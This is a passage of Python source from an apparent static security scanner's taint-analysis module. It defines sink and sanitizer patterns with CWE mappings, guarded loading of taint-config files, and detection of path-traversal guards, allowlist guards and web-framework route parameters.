                          r"|validator\.escape|filterXSS|xssFilters\.\w+|_\.escape|lodash\.escape)\s*\("
                          + _SAN_BODY + r"\)"),
        "SQL": re.compile(r"(?:mysql2?|pool|connection|conn|db)\.escape\s*\(" + _SAN_BODY + r"\)"),
        "PATH": re.compile(r"path\.basename\s*\(" + _SAN_BODY + r"\)"),
        "CMD": re.compile(r"(?:shellQuote|shell_quote)\s*\(" + _SAN_BODY + r"\)"),
        # the Referer: the page the user came from (a redirect "back")
        "REDIR": re.compile(r"\b(?:req|request)\.(?:get|header)\s*\(\s*['\"][Rr]eferr?er['\"]\s*\)"
                            r"|\b(?:req|request)\.headers\s*(?:\.\s*referr?er\b|\[\s*['\"]referr?er['\"]\s*\])"),
    },
}

# Flask's typed lookup, `request.args.get("page", 1, type=int)`, returns a
# number (or the default): a full sanitizer like int(…).
_TYPED_GET_RE = re.compile(r"(?<![\w.])[A-Za-z_][\w.]*\.get(?:list)?\s*\(([^()]{0,256})\)")
_TYPED_ARG_RE = re.compile(r"\btype\s*=\s*(?:int|float|bool)\b")


def _typed_get(m):
    return " " if _TYPED_ARG_RE.search(m.group(1)) else m.group()


def _neutralize(text, lang, suffix=None):
    """Strip sanitizer calls so their sanitized content stops counting as taint."""
    text = _FULL_SAN[lang].sub(" ", text)
    if lang == "py" and "type" in text:
        text = _TYPED_GET_RE.sub(_typed_get, text)
    if suffix and suffix in _PARTIAL_SAN.get(lang, {}):
        text = _PARTIAL_SAN[lang][suffix].sub(" ", text)
    return text

# SQL suffix ↔ flow category, for applying shared config to the intra-file engine
_SUFFIX_BY_CATEGORY = {
    "SQL injection": "SQL", "command injection": "CMD", "code injection": "CODE",
    "template injection": "SSTI", "path traversal": "PATH",
    "server-side request forgery": "SSRF", "open redirect": "REDIR",
    "cross-site scripting": "XSS",
}
_CAT_META = {  # category -> (severity, cwe, fix) for intra-file sink rows
    "SQL injection": ("BLOCKER", "CWE-89", "Use parameterized queries with placeholders."),
    "command injection": ("CRITICAL", "CWE-78", "Pass args as a list with shell=False / use execFile."),
    "code injection": ("CRITICAL", "CWE-95", "Never execute untrusted strings; use safe parsing."),
    "template injection": ("CRITICAL", "CWE-1336", "Pass data as template parameters."),
    "path traversal": ("MAJOR", "CWE-22", "Confine the path to an allowed base directory."),
    "server-side request forgery": ("MAJOR", "CWE-918", "Allowlist hosts/schemes."),
    "open redirect": ("MAJOR", "CWE-601", "Allowlist redirect targets."),
    "cross-site scripting": ("MAJOR", "CWE-79", "Escape/sanitize before rendering."),
}

#: Exit code for a taint config passed via --taint-config that cannot be
#: loaded or whose rules failed validation (unknown category, empty pattern,
#: malformed section, unsafe regex) — or a repository config under
#: --strict-taint-config. Distinct from the quality-gate exit 1, the usage
#: exit 2, EXIT_OUTPUT's 3 and the internal-error exit 5.
EXIT_TAINT_CONFIG = 4

#: The complete set of sink categories a taint config may use (sorted for
#: stable warning/report text). Kept in sync with _CAT_META / _SUFFIX_BY_CATEGORY.
VALID_CATEGORIES = tuple(sorted(_CAT_META))

# Validation warnings from the most recent apply_taint_config() call: every
# rule the loader refused. Rules are never silently dropped — a custom sink
# that fails validation must not quietly become inert while the scan still
# reports PASSED (the bug this fixes). The CLI drains these after loading.
_TAINT_CONFIG_WARNINGS = []


def _taint_config_warn(msg):
    _TAINT_CONFIG_WARNINGS.append(msg)


def get_taint_config_warnings():
    """Warnings from the last apply_taint_config() call — rules that were
    rejected rather than applied. Each names the rule and the reason, and
    lists the valid categories. The CLI prefixes each with the file path."""
    return list(_TAINT_CONFIG_WARNINGS)


def _dedupe(msgs):
    """First-occurrence de-duplication of warning messages (both taint
    engines report the same rejected rule; print each rejection once)."""
    seen, out = set(), []
    for m in msgs:
        if m not in seen:
            seen.add(m)
            out.append(m)
    return out


def apply_taint_config(cfg, allow_sanitizers=True):
    """Extend the intra-file taint model (sources/sinks/sanitizers) from a
    config — the same file consumed by the interprocedural engine.

    *cfg* is a parsed config (validated here) or a taintspec.TaintSpec the
    caller already validated. Both engines validate through
    lazaret.scanner.taintspec, so they accept exactly the same rules and
    report rejections with identical texts (the CLI prints each once).
    Invalid rules are not silently dropped: each one records a warning (see
    get_taint_config_warnings()) naming the rule and the reason. User regexes
    are guarded (length cap, static backtracking check, and each match sees
    at most taintspec.MAX_MATCH_TEXT characters of a line).
    allow_sanitizers=False (a config from the scanned repository): its
    sanitizers are ignored, never applied.
    """
    del _TAINT_CONFIG_WARNINGS[:]
    spec = (cfg if isinstance(cfg, taintspec.TaintSpec)
            else taintspec.validate(cfg, allow_sanitizers=allow_sanitizers))
    _TAINT_CONFIG_WARNINGS.extend(spec.warnings)
    for lang_key, lang in (("python", "py"), ("javascript", "js")):
        ls = spec.lang(lang_key)
        if ls.sources:
            TAINT_SOURCES[lang] = taintspec.extend_pattern(TAINT_SOURCES[lang],
                                                           ls.sources)
        for gp, cat in ls.sinks:
            sev, cwe, fix = _CAT_META[cat]
            TAINT_SINKS[lang].append((_SUFFIX_BY_CATEGORY[cat], gp, cat, sev, cwe, fix))
        for name in ls.full:
            # names are validated call names; re.escape makes them literal
            _FULL_SAN[lang] = re.compile(
                _FULL_SAN[lang].pattern + "|" + re.escape(name)
                + r"\s*\(" + _SAN_BODY + r"\)")
        for name, cats in ls.partial.items():
            add = re.escape(name) + r"\s*\(" + _SAN_BODY + r"\)"
            for cat in sorted(cats):
                suf = _SUFFIX_BY_CATEGORY[cat]
                base = _PARTIAL_SAN[lang].get(suf)
                _PARTIAL_SAN[lang][suf] = re.compile(
                    (base.pattern + "|" + add) if base else add)


#: The scanned repository's own taint config (never auto-trusted).
REPO_TAINT_CONFIG = ".lazaret-taint.json"
#: Largest taint-config file read (bytes).
TAINT_CONFIG_MAX_BYTES = 1_000_000


def _read_taint_config(path, from_repo):
    """(cfg, None) or (None, reason) for a taint-config file.

    Only a regular file is read (a FIFO would hang the open); a repository
    config must not be a symlink either. Reads are bounded; bad UTF-8,
    invalid JSON, huge integers and deep nesting are reasons, not crashes."""
    try:
        st = os.lstat(path) if from_repo else os.stat(path)
    except OSError as exc:
        return None, str(exc.strerror or exc)
    import stat as _stat
    if not _stat.S_ISREG(st.st_mode):
        return None, ("not a regular file (symlinks and special files are "
                      "not followed)" if from_repo else "not a regular file")
    if st.st_size > TAINT_CONFIG_MAX_BYTES:
        return None, (f"{st.st_size} bytes exceeds the "
                      f"{TAINT_CONFIG_MAX_BYTES}-byte limit")
    try:
        with open(path, "rb") as fh:
            data = fh.read(TAINT_CONFIG_MAX_BYTES + 1)
        return json_loads_bounded(data.decode("utf-8")), None
    except (OSError, ValueError, MemoryError) as exc:
        # ValueError covers JSONDecodeError, UnicodeDecodeError, the int-digit
        # limit and JsonTooDeep (1149e3e5: a deep-nested config).
        return None, str(exc)


def load_taint_config_for_scan(explicit_path, scan_root, trust_repo=False,
                               strict=False):
    """Load the taint config for one CLI scan; return report notes (issues).

    * --taint-config PATH: trusted fully (sources, sinks, sanitizers).
    * <scan-root>/.lazaret-taint.json: scanned-repository content, so it is
      loaded only with --trust-repo-config, and then may add sources and
      sinks but NOT sanitizers (ignored with a note) — a repository must not
      be able to declare its own code safe. Without the flag a one-line note
      says it was found and not loaded. A used repository config is recorded
      in the report as a Q-TAINT-CONFIG INFO note naming the file.
    Validation is fail-loud: rejected rules print warnings naming the file,
    the rule and the reason; with an explicit --taint-config (or strict,
    i.e. --strict-taint-config) rejected rules exit EXIT_TAINT_CONFIG (4).
    A config that cannot be loaded at all (missing, unreadable, not a
    regular file, too large, bad UTF-8, invalid JSON, too deep, an integer
    past the digit limit) is the same: `error:` and exit 4 for an explicit
    --taint-config or with strict, a warning for a trusted repository
    config (the scan then runs with the built-in model only).
    """
    if explicit_path:
        path, from_repo = explicit_path, False
    else:
        path = os.path.join(scan_root, REPO_TAINT_CONFIG)
        if not os.path.lexists(path):
            return []
        if not trust_repo:
            # audit H1: the path is under the scanned repo — sanitize.
            print(f"  note: {sanitize_term_line(path)} found but not loaded — a "
                  f"scanned repository's taint config is untrusted; pass "
                  f"--trust-repo-config to use its sources/sinks")
            return []
        from_repo = True
    cfg, err = _read_taint_config(path, from_repo)
    if err is not None:
        # audit H1: both the path and the reason (JSONDecodeError position
        # text can echo hostile config bytes) are sanitized.
        # An explicit --taint-config that cannot be loaded must not degrade
        # into a scan without the rules CI asked for (exit 4, like rejected
        # rules); a repository config only warns unless --strict-taint-config.
        fatal = not from_repo or strict
        print(f"{'error' if fatal else 'warning'}: could not load taint config "
              f"{sanitize_term_line(path)}: {sanitize_term_line(err)}", file=sys.stderr)
        if fatal:
            sys.exit(EXIT_TAINT_CONFIG)
        return []
    spec = taintspec.validate(cfg, allow_sanitizers=not from_repo)
    apply_taint_config(spec)
    if lazaret_flow is not None:
        lazaret_flow.configure(spec)
    # audit H1: path may be the repo's own config (repo content).
    print(f"  Loaded taint config: {sanitize_term_line(path)}"
          + (" (from the scanned repository: sources and sinks only)"
             if from_repo else ""))
    rejected = _dedupe(spec.warnings)
    for msg in rejected + _dedupe(spec.notes):
        # audit H1: msg embeds rejected rule names/patterns verbatim.
        print(f"warning: {sanitize_term_line(path)}: {sanitize_term_line(msg)}",
              file=sys.stderr)
    if rejected and (not from_repo or strict):
        print(f"error: {len(rejected)} taint-config rule(s) rejected in "
              f"{sanitize_term_line(path)} — fix them (see warnings above) or the "
              f"custom detection they define will not run", file=sys.stderr)
        sys.exit(EXIT_TAINT_CONFIG)
    if not from_repo:
        return []
    n = spec.counts()
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            cfg_lines = fh.read(TAINT_CONFIG_MAX_BYTES).split("\n")
    except OSError:
        cfg_lines = []
    note = mk_issue(
        {"id": "Q-TAINT-CONFIG", "name": "Taint rules loaded from the scanned repository",
         "type": "HOTSPOT", "sev": "INFO",
         "msg": (f"Custom taint rules from the repository's own {REPO_TAINT_CONFIG} "
                 f"were used (--trust-repo-config): {n['sources']} source(s), "
                 f"{n['sinks']} sink(s)"
                 + (f"; {spec.ignored_sanitizers} sanitizer rule(s) ignored"
                    if spec.ignored_sanitizers else "") + "."),
         "why": "A repository-supplied taint config changes what this scan "
                "looks for. Sources and sinks from it are applied; sanitizers "
                "never are, so the repository cannot declare its own code safe.",
         "fix": "Review the file; to trust it fully (including sanitizers), "
                "pass it explicitly with --taint-config.",
         "ref": "Taint configuration provenance"},
        REPO_TAINT_CONFIG, 1, cfg_lines)
    return [note]


# Identifier runs for carrier matching. A variable v "appears" in a text iff
# it equals one of these maximal runs — the old per-variable `\bv\b` regex
# test, done as one findall + set lookups. (One compiled regex per tainted
# variable thrashed re's 512-pattern cache: an a1=a0 … a1000=a999 chain took
# 20 s.) For JS, `$` counts as an identifier character.
_IDENT_RUN_RE = {"py": re.compile(r"\w+"), "js": re.compile(r"[\w$]+")}


# A statement taint reads may run over several lines: a line whose brackets
# stay open (`RESPONSE += (` / `subprocess.run(` / `const q = \`…`) is read
# together with the lines that continue it — at most TAINT_JOIN_MAX_LINES of
# them and TAINT_JOIN_MAX_CHARS of their text, joined with spaces.
TAINT_JOIN_MAX_LINES = 8
TAINT_JOIN_MAX_CHARS = 4000
_BRACKET_DELTA = {"(": 1, "[": 1, "{": 1, ")": -1, "]": -1, "}": -1}


def _bracket_depth(code):
    """Brackets `code` opens and leaves open (string literals not counted)."""
    return sum(_BRACKET_DELTA.get(ch, 0) for ch in STRING_LIT_RE.sub("", code))


def _arg_end(text, start):
    """Index of the comma or closing bracket that ends the argument starting
    at `start` in `text` (len(text) when nothing does); brackets and string
    literals inside the argument are skipped."""
    depth, i, n = 0, start, len(text)
    while i < n:
        ch = text[i]
        if ch in "\"'`":
            j = text.find(ch, i + 1)
            if j < 0:
                return n
            i = j + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                return i
            depth -= 1
        elif ch == "," and depth == 0:
            return i
        i += 1
    return n


def _call_close(text, start):
    """Index of the bracket that closes a call whose arguments start at
    `start` in `text` (len(text) when nothing does)."""
    while True:
        end = _arg_end(text, start)
        if end >= len(text) or text[end] != ",":
            return end
        start = end + 1


def _first_arg(text):
    """The first argument of a call whose text after the opening parenthesis
    is `text`; a parenthesized tuple is read as its first element
    (`make_response((body, {"X-H": v}))` → `body`)."""
    arg = text[:_arg_end(text, 0)]
    s = arg.lstrip()
    if s.startswith("("):
        k = _arg_end(s, 1)
        if k < len(s) and s[k] == ",":
            return s[1:k]
    return arg


# a keyword argument that names no target (`data=`, `cwd=`, `timeout=`); the
# ones that do (`url=`, `file=`, `args=`, …) are read like positional ones
_KWARG_RE = re.compile(r"\s*(?!(?:url|uri|file|filename|path|path_or_file|args|cmd|command|src|dst|source"
                       r"|destination)\s*=)[A-Za-z_]\w*\s*=(?!=)")


def _positional_args(text):
    """A call's arguments (`text` follows its opening parenthesis) without its
    keyword arguments (see above): `requests.post(url, data=d)` → `url`."""
    out, i, n = [], 0, len(text)
    while True:
        end = _arg_end(text, i)
        arg = text[i:end]
        if not _KWARG_RE.match(arg):
            out.append(arg)
        if end >= n or text[end] != ",":
            return ",".join(out)
        i = end + 1


# Which arguments of a built-in sink carry the injection. Only the first: a
# query's bound parameters (`execute(sql, (x,))`), a response's status and
# headers, a redirect's code, a template's context and eval's namespaces are
# data — and send_from_directory's directory: it joins the file name safely.
# In JavaScript the first too for a query, a template's source, a file
# written or removed (`fs.writeFile(p, data)`) and a response body
# (`res.send(body)`). Only the positional ones: `requests.post(url, data=d)`,
# `send_file(f, download_name=n)` and `subprocess.run(cmd, cwd=d)` name no
# target in their keywords. Other rows (the rest of the JavaScript ones,
# Django's `.extra(where=[…])`, the rows a taint config adds) read every
# argument — never the code after the call on the same line
# (`exec(cmd); log(location.href)`).
_SINK_ARGS = {row[1]: "first" for row in TAINT_SINKS["py"]
              if row[0] in ("SQL", "XSS", "REDIR", "SSTI", "CODE") and "extra" not in row[1].pattern}
_SINK_ARGS.update({row[1]: "positional" for row in TAINT_SINKS["py"]
                   if row[0] in ("CMD", "PATH", "SSRF") and "send_from_directory" not in row[1].pattern})
_SINK_ARGS.update({row[1]: "first" for row in TAINT_SINKS["py"] if "send_from_directory" in row[1].pattern})
_SINK_ARGS.update({row[1]: "first" for row in TAINT_SINKS["js"]
                   if row[0] in ("SQL", "SSTI") or (row[0] == "PATH" and "writeFile" in row[1].pattern)
                   or (row[0] == "XSS" and "send" in row[1].pattern)})


def _extent(text):
    """`text` (what follows a sink's match) up to the end of the sink's
    arguments: the bracket that closes the call, or the end of the statement
    (a `;` outside brackets) for an assignment sink such as `.innerHTML =`."""
    depth, i, n = 0, 0, len(text)
    while i < n:
        ch = text[i]
        if ch in "\"'`":
            j = text.find(ch, i + 1)
            if j < 0:
                return text
            i = j + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                return text[:i]
            depth -= 1
        elif ch == ";" and depth == 0:
            return text[:i]
        i += 1
    return text


# A redirect to a path on this site: an argument that starts with a string
# literal holding '/' and then neither '/' nor '\\' nor the literal's end
# nor a field (`redirect("/user/" + id)`, `res.redirect(f"/search?q={q}")`)
# cannot change the host; neither can one that starts with a scheme, a host
# (no field in it) and a '/' (`"https://github.com/org/repo/commit/%s" %
# rev`). A value assigned from such an expression is clean for open redirect
# (taint_scan).
_SAME_SITE_RE = re.compile(r"""\s*[rRuUfF]{0,2}["'`](?:/(?![/\\"'`{$])|https?://[^/"'`?#\\\s{}$]+/)""")


def _offsite_args(args):
    """`args` without the arguments that redirect to this site (see above)."""
    out, i, n = [], 0, len(args)
    while True:
        end = _arg_end(args, i)
        arg = args[i:end]
        if not _SAME_SITE_RE.match(arg):
            out.append(arg)
        if end >= n or args[end] != ",":
            return ",".join(out)
        i = end + 1


def _sink_args(text, sink_re, lang, suffix):
    """The part of a sink's arguments (`text` follows the sink's match) that
    carries the injection (see above)."""
    mode = _SINK_ARGS.get(sink_re)
    if mode == "first":
        args = _first_arg(text)
    elif mode == "positional":
        args = _positional_args(text)
    else:
        args = _extent(text)
    return _offsite_args(args) if suffix == "REDIR" else args


# Path-traversal guards (barrier guards): a condition that rejects a value
# holding '..' or checks that it stays under a base directory, on a branch
# that leaves — `if ".." in name: abort(400)`, `if not path.startswith(BASE):
# return …`, `if (p.includes("..")) return next(err)`. After one, the value
# (and what is built from it) no longer carries path traversal. The exit is
# on the `if` line or starts a line of its block (the lines below it, more
# indented, at most _GUARD_BLOCK_LINES of them).
_GUARD_BLOCK_LINES = 12
_GUARD_IF_RE = {"py": re.compile(r"^\s*(?:el)?if\b"),
                "js": re.compile(r"^\s*(?:\}\s*)?(?:else\s+)?if\s*\(")}
_DOTDOT = r"""(?:'\.\.[/\\]{0,2}'|"\.\.[/\\]{0,2}"|`\.\.[/\\]{0,2}`)"""
_GUARD_VAR_RES = {
    "py": (re.compile(_DOTDOT + r"\s+(?:not\s+)?in\s+([A-Za-z_]\w*)(?![\w.(\[])"),
           re.compile(r"(?<![\w.])([A-Za-z_]\w*)\s*\.\s*(?:startswith|is_relative_to)\s*\(\s*(?![\s'\"])"),
           re.compile(r"(?:realpath|abspath|normpath)\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\.\s*startswith\s*\(\s*(?![\s'\"])")),
    "js": (re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*(?:includes|indexOf)\s*\(\s*" + _DOTDOT + r"\s*\)"),
           re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*startsWith\s*\(\s*(?![\s'\"`])")),
}
# os.path.commonpath([BASE, path]): every name in the list
_GUARD_COMMONPATH_RE = re.compile(r"commonpath\s*\(\s*[\[(]([^\[\]()]{0,256})[\])]")
_GUARD_NAME_RE = re.compile(r"^\s*([A-Za-z_]\w*)\s*$")
_GUARD_EXIT_RE = {
    "py": re.compile(r"\b(?:return|raise|continue|break)\b|(?<![\w.])(?:abort|flask\.abort|sys\.exit)\s*\("),
    "js": re.compile(r"\b(?:return|throw|continue|break)\b|(?<![\w$.])process\.exit\s*\("),
}
# Allowlist guards: a value found in a collection of the code's own (`if name
# in ALLOWED:`, `if (allowed.includes(name))`, `.has(name)`) is one of its
# members inside the block — clean for every category there — and after a
# branch that leaves when it is not (`if name not in ALLOWED: abort(404)`,
# `if (!allowed.has(name)) return …`). Not when the collection is request
# data or holds it (`if key in request.args`).
_ALLOW_GUARD_RE = {
    "py": re.compile(r"^\s*(?:el)?if\s+(?:\(\s*)?([A-Za-z_]\w*)\s+(not\s+)?in\s+([^:\n]+?)\s*\)?\s*:"),
    "js": re.compile(r"^\s*(?:\}\s*)?(?:else\s+)?if\s*\(\s*(!\s*)?([\w$.]+|\[[^\[\]\n]*\])\s*\.\s*(?:includes|has)\s*\("
                     r"\s*([A-Za-z_$][\w$]*)\s*\)\s*\)"),
}


def _allow_guard(stmt, lang):
    """(name, collection text, negated) of an allowlist guard in `stmt`
    (see above), or None."""
    m = _ALLOW_GUARD_RE[lang].match(stmt)
    if not m:
        return None
    if lang == "py":
        return m.group(1), m.group(3), bool(m.group(2))
    return m.group(3), m.group(2), bool(m.group(1))


def _guarded_names(stmt, lang):
    """Names a path-traversal guard condition in `stmt` checks (see above)."""
    names = [m.group(1) for r in _GUARD_VAR_RES[lang] for m in r.finditer(stmt)]
    if lang == "py" and "commonpath" in stmt:
        for m in _GUARD_COMMONPATH_RE.finditer(stmt):
            names.extend(n.group(1) for n in map(_GUARD_NAME_RE.match, m.group(1).split(",")) if n)
    return names


def _guard_exits(ctx, i, stmt, lang):
    """True when the `if` on line i (joined statement `stmt`) leaves: an
    exit on its own line or at the start of a line of its block."""
    exit_re = _GUARD_EXIT_RE[lang]
    if exit_re.search(stmt):
        return True
    line = ctx.mcode(i)
    indent = len(line) - len(line.lstrip())
    seen, j = 0, i + 1
    while j < len(ctx.lines) and seen < _GUARD_BLOCK_LINES:
        if not ctx.cmask[j]:
            code = ctx.mcode(j)
            body = code.lstrip()
            if body:
                if len(code) - len(body) <= indent:
                    return False
                if exit_re.match(body):
                    return True
                seen += 1
        j += 1
    return False


# Flask (or Quart) views: what one returns is the response body, HTML by
# default. A function decorated with @….route(…) — or @….get / post / put /
# patch / delete(…) in a file that imports flask or quart — is a view; its own
# `return` lines (not those of a function nested in it) are XSS sinks unless
# the value (a returned tuple's first item) is a JSON container, a redirect, a
# template, a file or a response object: those are read as what they are. A
# FastAPI path operation returns JSON unless its decorator sets
# `response_class=HTMLResponse`: then it is a view too.
_FLASK_IMPORT_RE = re.compile(r"^\s*(?:from\s+(?:flask|quart)\b|import\s+(?:flask|quart)\b)")
_FASTAPI_IMPORT_RE = re.compile(r"^\s*(?:from\s+fastapi\b|import\s+fastapi\b)")
_DJANGO_IMPORT_RE = re.compile(r"^\s*(?:from\s+django\b|import\s+django\b)")
_VIEW_DECORATOR_RE = re.compile(r"^\s*@[\w.]+\.(route|get|post|put|patch|delete|api_route)\s*\(")
_HTML_RESPONSE_CLASS_RE = re.compile(r"\bresponse_class\s*=\s*(?:[\w.]*\.)?HTMLResponse\b")
_DEF_RE = re.compile(r"^\s*(?:async\s+def|def|class)\b")
_RETURN_RE = re.compile(r"^\s*return\b")
_VIEW_RETURN_SKIP_RE = re.compile(
    r"\s*(?:\{|\[|dict\s*\(|(?:[A-Za-z_][\w.]*\.)?(?:redirect|jsonify|url_for|send_file|send_from_directory"
    r"|send_static_file|abort|render_template)\s*\()")


# A view that returns what a function call gives (`return User.to_dict(q)`,
# `return request.get_json()`) returns that function's value, most often a
# dict or a response: only the string builders' results are read as the body
# (`return str(x)`, `return "…".format(x)`, `return ", ".join(xs)`).
_VIEW_CALL_RE = re.compile(r"\s*([A-Za-z_][\w.]*)\s*\(")
_STRING_BUILDERS = frozenset((
    "str", "format", "join", "replace", "strip", "lstrip", "rstrip", "upper", "lower", "title",
    "capitalize", "casefold", "swapcase", "decode", "zfill", "ljust", "rjust", "center", "expandtabs",
    "dumps"))


def _view_body(value):
    """False when a view's return value `value` is a call of a function that
    is not a string builder (see above)."""
    m = _VIEW_CALL_RE.match(value)
    if not m or m.group(1).rsplit(".", 1)[-1] in _STRING_BUILDERS:
        return True
    end = _call_close(value, m.end())
    return end >= len(value) or bool(value[end + 1:].strip())


def _view_returns(ctx):
    """Indices of the `return` lines of the file's Flask views and HTML
    FastAPI path operations (see above)."""
    code = [("" if ctx.cmask[i] else ctx.mcode(i)) for i in range(len(ctx.lines))]
    flask = any(_FLASK_IMPORT_RE.match(c) for c in code)
    fastapi = not flask and any(_FASTAPI_IMPORT_RE.match(c) for c in code)
    out = set()
    stack = []              # [indent, is_view] of the enclosing defs
    pending = False         # a view decorator seen, its def not yet
    operation = False       # the decorator being read is a FastAPI path operation's
    open_brackets = 0       # a decorator's arguments still open …
    continued = 0           # … over this many lines (at most TAINT_JOIN_MAX_LINES)
    for i, c in enumerate(code):
        body = c.lstrip()
        if not body:
            continue
        if open_brackets > 0 and continued < TAINT_JOIN_MAX_LINES:
            open_brackets += _bracket_depth(c)
            continued += 1
            if operation and _HTML_RESPONSE_CLASS_RE.search(c):
                pending = True
            continue
        open_brackets = 0
        operation = False
        indent = len(c) - len(body)
        while stack and indent <= stack[-1][0]:
            stack.pop()
        if body.startswith("@"):
            d = _VIEW_DECORATOR_RE.match(c)
            if d and (d.group(1) == "route" or flask):
                pending = True
            elif d and fastapi:
                operation = True
                if _HTML_RESPONSE_CLASS_RE.search(c):
                    pending = True
            open_brackets, continued = _bracket_depth(c), 0
            continue
        if _DEF_RE.match(c):
            stack.append([indent, pending and not body.startswith("class")])
            pending = False
            continue
        pending = False
        if stack and stack[-1][1] and _RETURN_RE.match(c):
            out.add(i)
    return out


# Route handlers (0.1.7): the parameters a web framework fills from the
# request are sources in the handler's body. Which ones is decided by
# lazaret.scanner.frameworks (shared with the interprocedural engine): a
# Flask view's URL rule variables, a FastAPI path operation's parameters but
# what it injects or validates to no free text, a Django view's parameters
# after `request` but the conventional int and slug names. Here they are
# read from the lines: a function decorated with @….route(RULE) — or
# @….get / post / put / patch / delete(RULE) in a file that imports flask or
# quart — is a Flask view; one decorated with @….get / post / put / patch /
# delete / options / head / api_route / websocket(…) in a file that imports
# fastapi a FastAPI path operation; in a file that imports django, a
# function whose first parameter is `request` (a method: `self, request`) a
# Django view. A decorator or signature is read over the lines that
# continue its brackets (at most TAINT_JOIN_MAX_LINES of them).
_ROUTE_DECORATOR_RE = re.compile(
    r"^\s*@[\w.]+\.(route|get|post|put|patch|delete|options|head|api_route|websocket)\s*\(")
_ROUTE_RULE_RE = re.compile(r"""\(\s*[rRuU]?(["'])(.*?)\1""")
_DEF_HEAD_RE = re.compile(r"^\s*(?:async\s+)?def\s+\w+\s*\(")
_PARAM_RE = re.compile(r"\s*\*{0,2}\s*([A-Za-z_]\w*)\s*")
_top_split = frameworks.top_split
_safe_type = frameworks.safe_type


def _signature_params(sig):
    """[(name, annotation, default)] of the parameters of the def whose text
    (with the lines that continue it) is `sig`."""
    m = _DEF_HEAD_RE.match(sig)
    if not m:
        return []
    out = []
    for part in _top_split(sig[m.end():_call_close(sig, m.end())], ","):
        pm = _PARAM_RE.match(part)
        if not pm or pm.end() < len(part) and part[pm.end()] not in ":=":
            continue
        ann, default = "", ""
        rest = part[pm.end():]
        if rest.startswith(":"):
            pieces = _top_split(rest[1:], "=")
            ann, default = pieces[0], "=".join(pieces[1:])
        elif rest.startswith("="):
            default = rest[1:]
        out.append((pm.group(1), ann.strip(), default.strip()))
    return out


def _fastapi_params(params, aliases=frozenset()):
    """The names of `params` a FastAPI path operation fills from the
    request; `aliases`: the file's dependency aliases."""
    return [name for name, ann, default in params if frameworks.fastapi_param(name, ann, default, aliases)]


def _flask_params(rule, params):
    """The names of `params` the Flask URL rule `rule` fills with free text."""
    free = frameworks.flask_free_vars(rule)
    return [name for name, _ann, _default in params if name in free]


def _django_params(params):
    """The names of `params` a Django URL pattern fills with free text, when
    `params` are a view's (see above)."""
    names = [name for name, _ann, _default in params]
    first = 2 if names[:2] == ["self", "request"] else 1 if names[:1] == ["request"] else 0
    if not first:
        return []
    return [name for name, ann, _default in params[first:] if frameworks.django_param(name, ann)]


def _route_params(ctx):
    """{index of a route handler's def line: [names of the parameters the
    framework fills from the request]} (see above)."""
    code = [("" if ctx.cmask[i] else ctx.mcode(i)) for i in range(len(ctx.lines))]
    flask = any(_FLASK_IMPORT_RE.match(c) for c in code)
    fastapi = not flask and any(_FASTAPI_IMPORT_RE.match(c) for c in code)
    django = any(_DJANGO_IMPORT_RE.match(c) for c in code)
    aliases = frameworks.dep_aliases("\n".join(code)) if fastapi else frozenset()

    def joined(i):
        """(line i's code with the lines that continue its brackets, the
        index of the last of them)."""
        parts, depth, j = [code[i]], _bracket_depth(code[i]), i
        while depth > 0 and j + 1 < len(code) and j + 1 <= i + TAINT_JOIN_MAX_LINES:
            j += 1
            parts.append(code[j])
            depth += _bracket_depth(code[j])
        return " ".join(parts), j

    out = {}
    routes = []             # (framework, rule) of the route decorators above the next def
    i = 0
    while i < len(code):
        c = code[i]
        body = c.lstrip()
        if not body:
            i += 1
            continue
        if body.startswith("@"):
            text, last = joined(i)
            d = _ROUTE_DECORATOR_RE.match(text)
            if d and (d.group(1) == "route" or (flask and d.group(1) in frameworks.FLASK_ROUTE_METHODS)):
                rule = _ROUTE_RULE_RE.search(text, d.end() - 1)
                routes.append(("flask", rule.group(2) if rule else ""))
            elif d and fastapi:
                routes.append(("fastapi", ""))
            i = last + 1
            continue
        if _DEF_HEAD_RE.match(c):
            text, last = joined(i)
            params = _signature_params(text)
            names = []
            for framework, rule in routes:
                names.extend(_fastapi_params(params, aliases) if framework == "fastapi" else _flask_params(rule, params))
            if not routes and django:
                names = _django_params(params)
            if names:
                out[i] = list(dict.fromkeys(names))
            routes = []
            i = last + 1
            continue
        routes = []
        i += 1
    return out


# Where a taint lives, read from the file's indentation: a name tainted in a
# function's body (a def or class in Python; in JavaScript a function, method
# or arrow function whose body is a block) is dropped when that body ends, so
# another function's variable of the same name is not taken for it. A
# reassignment that runs whenever the tainting one did — later in the same
# block, or in a block that encloses it — replaces the value (`path =
# secure_filename(path)` is clean for path traversal; `name = "fixed"` is
# clean); one in a nested or sibling block (an if, an else, a case) adds to
# it: the name stays tainted, and clean only for what both values are clean
# for. The lines of a multi-line string are not part of the structure, nor
# in Python the lines that continue a statement's brackets (at most
# TAINT_JOIN_MAX_LINES of them); JavaScript's braces open blocks, and its
# lines are read by their indentation alone.
_JS_FUNCTION_WORD_RE = re.compile(r"\bfunction\b")
_JS_METHOD_HEAD_RE = re.compile(
    r"^\s*(?:(?:async|static|get|set)\s+){0,3}(?!(?:if|for|while|switch|catch|with|function|return)\b)"
    r"[A-Za-z_$][\w$]*\s*\([^()]*\)$")


def _scope_opener(code, lang):
    """True when line `code` opens a function body (see above)."""
    if lang == "py":
        return bool(_DEF_RE.match(code))
    t = code.rstrip()
    if not t.endswith("{"):
        return False
    head = t[:-1].rstrip()
    if head.endswith("=>"):
        return True
    if not head.endswith(")"):
        return False
    return bool(_JS_FUNCTION_WORD_RE.search(head) or _JS_METHOD_HEAD_RE.match(head))


def _literal_continuations(ctx):
    """Indices of the lines whose first non-blank character lies inside a
    string literal that began on an earlier line."""
    lits = ctx._literals
    out = set()
    if not lits:
        return out
    starts = _line_starts(ctx.content)
    k, reach = 0, -1
    for j, line in enumerate(ctx.lines):
        p = starts[j] + len(line) - len(line.lstrip())
        while k < len(lits) and lits[k][0] < p:
            reach = max(reach, lits[k][1])
            k += 1
        if p < reach:
            out.add(j)
    return out


def taint_scan(path, lines, lang, ctx=None):
    if lang not in TAINT_SOURCES:   # SQL and others: pattern rules only, no taint flow
        return []
    if ctx is None or ctx.lines is not lines:
